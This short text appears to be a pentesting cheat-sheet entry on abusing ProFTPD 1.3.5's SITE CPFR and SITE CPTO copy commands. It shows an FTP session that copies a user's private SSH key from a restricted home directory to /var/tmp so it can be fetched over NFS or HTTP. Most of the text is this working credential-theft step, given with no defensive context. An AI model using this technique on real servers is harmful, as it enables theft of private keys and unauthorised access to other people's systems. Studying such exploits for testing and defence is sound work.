This little hack is good for copying (blindly?) files (keys) from a 
restricted directory to another location that we may have access perhaps 
we mounted a remote dir via NFS or whatnot or we can just grab it via HTTP.


Real Example:
```
    220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.12.255]
    site cpfr /home/joe/.ssh/id_rsa
    350 File or directory exists, ready for destination name
    site cpto /var/tmp/id_rsa
    250 Copy successful
    quit
    221 Goodbye.
```
    
